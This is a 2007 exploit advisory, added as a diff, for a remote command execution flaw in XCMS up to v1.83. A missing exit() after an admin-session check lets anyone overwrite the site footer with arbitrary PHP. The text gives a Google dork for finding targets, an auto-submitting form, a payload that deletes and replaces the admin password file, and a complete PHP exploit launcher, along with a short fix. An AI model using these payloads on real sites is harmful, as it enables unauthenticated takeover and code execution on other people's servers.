@@ -1,0 +1,106 @@
+Name            :  XCMS <= v1.83 Remote Command Execution Vulnerability
+Author          :  x0kster
+Email           :  x0kster@gmail.com
+Site            :  ihteam.net
+Script Download :  http://www.xcms.it
+Date            :  28/12/2007
+Dork            :  inurl:"mod=notizie"
+
+The xcms's footer(that is in "/dati/generali/footer.dtb") is included in each page of the xcms.
+Taking "home.php" for example:
+ 
+       <?php
+         //home.php
+         [...]
+         include(CSTR."footer".STR); // <- "CSTR" and "STR" are the constants previously declared. They refers to "/dati/generali" and "dtb"
+       ?>
+
+So the xcms allow you to modify the footer throught a bugged page called cpie.php included in the admin panel.
+So let's take a look to the bugged code.
+
+       <?php
+         //cpie.php
+         [...]
+         if(isset($_SESSION['logadmin'])===false){ header("location:index.php"); } // <- so miss an exit() :-D
+         [...]
+         if(isset($_POST['salva'])){
+            Scrivi(CGEN."footer".DTB,stripslashes($_POST['testo_0'])); // <- save the changements without any kind of control
+         } 
+         [...]
+       ?>
+       
+So with a simple html form we can change the footer.
+Ex:
+
+        <form name="editor" action="http://[SITE_WITH_XCMS]/index.php?lng=it&amp;pg=admin&amp;s=cpie" method="post">
+        <input type="hidden" name="salva" value="OK" />
+        <textarea name="testo_0"><?php YOUR PHP CODE ?></textarea>
+        <input type="submit" value="Modifica" />
+        </form>
+        <script>document.editor.submit()</script>
+        
+        Note: This is NOT a CSRF, this is just an example to change the footer without the admin credentials.
+ 
+ 
+       
+Trick: We can change the admin panel password by inserting this code in the footer:
+      
+       <?php
+       $pwd = "owned"; // <- Place here your new password.
+       $pwd2 = md5($pwd);
+       unlink("dati/generali/pass.php");
+	   $f = fopen("dati/generali/pass.php",w);
+       fwrite($f,"<?php \$mdp = \"$pwd2\"; ?>");
+       fclose($f);
+       ?>
+       
+This code delete the old password file and then create a new one with your new password.
+
+
+Fix:
+  
+        <?php
+         //cpie.php
+         [...]
+         if(isset($_SESSION['logadmin'])===false){ header("location:index.php"); exit(); } // with an exit() we can fix the bug.
+         [...]
+         if(isset($_POST['salva'])){
+            Scrivi(CGEN."footer".DTB,stripslashes($_POST['testo_0'])); // <- save the changements without any kind of control
+         } 
+         [...]
+       ?>
+
+So this is a simple exploit:
+
+
+<?php
+if(isset($_POST['send']) and isset($_POST['code']) and isset($_POST['site'])){
+echo "
+<form name=\"editor\" action=\"http://".$_POST['site']."/index.php?lng=it&amp;pg=admin&amp;s=cpie\" method=\"post\">
+<input type=\"hidden\" name=\"salva\" value=\"OK\" />
+<textarea name=\"testo_0\">".$_POST['code']."</textarea>
+<input type=\"submit\" value=\"Modifica\" />
+</form>
+<script>document.editor.submit()</script>";
+}else{
+echo"
+<pre>
+XCMS <= v1.82 Remote Command Execution Vulnerability
+Dork  :  inurl:\"mod=notizie\"
+by x0kster
+Visit ihteam.net
+</pre>
+<form method=POST action=".$_POST['PHP_SELF'].">
+<pre>
+Site     :
+<input type=text name=site />
+Code     :
+<textarea name=code cols=49 rows=14>Your code here</textarea>
+<input type=submit value=Exploit />
+<input type=hidden name=\"send\" />
+</pre>
+</form>";	  
+}		
+?>
+
+# milw0rm.com [2007-12-30]
